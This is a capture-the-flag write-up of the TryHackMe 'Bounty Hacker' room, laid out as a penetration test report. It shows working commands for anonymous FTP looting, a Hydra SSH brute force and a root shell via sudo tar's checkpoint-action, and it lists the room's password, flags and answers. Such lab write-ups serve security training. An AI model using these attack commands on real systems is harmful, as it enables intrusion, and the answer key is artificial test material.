# TryHackMe – Bounty Hacker Penetration Test Report

**Room:** [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)  
**Tester:** Nakulan  
**Target-IP:** 
**Date:** 12-08-2025

---

## 1. Executive Summary
A penetration test was conducted against the **Bounty Hacker** target. Enumeration revealed FTP, SSH, and HTTP services. An **anonymous FTP** share exposed files (`task.txt`, `locks.txt`) that enabled **SSH credential brute-forcing**. After gaining a shell as user `lin`, **sudo misconfiguration** on `/bin/tar` was leveraged (GTFOBins) to obtain a root shell and exfiltrate flags.

**Key Findings**
- Anonymous FTP allowed retrieval of sensitive files.
- SSH password discovered via brute force using leaked wordlist.
- Sudo allowed running `/bin/tar` as root, enabling privilege escalation.

---

## 2. Scope
- Services exposed on the target host (FTP, SSH, HTTP).
- Userland to root compromise.
- No DoS, no impact to other hosts.

---

## 3. Methodology
1. **Reconnaissance** – Service & version detection.  
2. **Enumeration** – FTP anonymous access; HTTP quick checks.  
3. **Exploitation** – SSH brute force using wordlist from FTP.  
4. **Privilege Escalation** – Abusing sudo permissions (`/bin/tar`).  
5. **Post-Exploitation** – Flag retrieval & documentation.

---

## 4. Findings

### 4.1 Reconnaissance (Nmap)
```bash
nmap -sV -sC -p- TARGET_IP
```
**Observed**

-21/tcp FTP (allows anonymous)

-22/tcp SSH

-80/tcp HTTP

### 4.2 FTP Enumeration (Anonymous)
```bash
ftp TARGET_IP

# Username: anonymous
# Password: (press Enter)

ls
get task.txt
bye
```
**Artifacts**

-task.txt → To-do list; author: lin.


**Answer (who wrote the task list?)** lin

### 4.3 SSH Brute Force (Hydra)

``` bash

hydra -l lin -P locks.txt ssh://TARGET_IP
```
**Discovered Credentials**

-Username: lin

-Password: RedDr4gonSynd1cat3

**Answer (what service can you bruteforce with the text file?)** SSH
**Answer (what is the user’s password?)** RedDr4gonSynd1cat3

### 4.4 User Shell & User Flag

```bash
ssh lin@TARGET_IP
# password: RedDr4gonSynd1cat3

whoami
ls -la ~
cat ~/user.txt
User Flag
THM{CR1M3_SyNd1C4T3}
```
**Answer (user.txt)** THM{CR1M3_SyNd1C4T3}

## 4.5 Privilege Escalation (sudo tar → GTFOBins)
Check sudo permissions:

```bash

sudo -l
```
**output :**user lin can run /bin/tar as root without password.

**Spawn root shell via tar checkpoint action:**

```bash

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
**Verify and read root flag:**

```bash
id
whoami
cat /root/root.txt
```

**Root Flag**

THM{80UN7Y_h4cK3r}
**Answer (root.txt)** THM{80UN7Y_h4cK3r}

### 5. Proof of Exploitation
Initial access: SSH as lin with password RedDr4gonSynd1cat3.

User flag: THM{CR1M3_SyNd1C4T3}

Root shell via sudo tar GTFOBins technique.

Root flag: THM{80UN7Y_h4cK3r}

### 6. Recommendations
Disable anonymous FTP and restrict external access to FTP.

Remove sensitive files (task.txt, locks.txt) from world-readable locations.

Enforce strong unique passwords; implement account lockout for SSH.

Restrict sudo permissions; remove NOPASSWD or unnecessary entries for /bin/tar.

Monitor and alert on brute-force attempts and anomalous sudo usage.

### 7. Quick Answers (as per room tasks)
Who wrote the task list? lin

What service can you bruteforce with the text file found? SSH

What is the user’s password? RedDr4gonSynd1cat3

user.txt THM{CR1M3_SyNd1C4T3}

root.txt THM{80UN7Y_h4cK3r}

### 8. Lessons Learned
Leaked wordlists and notes often lead to credential compromise.

Minimal sudo misconfigurations (e.g., allowing /bin/tar) can yield full root.

System hardening and least-privilege principles are critical to prevent escalation.


